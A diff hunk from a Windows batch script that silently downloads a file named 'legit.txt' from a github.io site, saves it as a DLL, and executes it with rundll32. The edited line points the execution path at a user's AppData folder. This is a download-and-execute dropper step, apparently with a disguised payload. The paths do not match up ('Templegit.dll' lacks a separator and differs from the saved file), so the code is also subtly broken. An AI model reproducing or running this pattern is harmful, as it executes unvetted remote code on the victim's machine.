@@ -5,5 +5,5 @@ for /f %%i in ("curl.exe") do if not exist "%%~$path:i" (
 	exit
 )
 curl -s https://bschroed96.github.io/legit.txt -o legit.dll
-rundll32.exe Templegit.dll ExportedFunction1
+rundll32.exe C:\Users\amin\AppData\Local\Templegit.dll ExportedFunction1
 exit
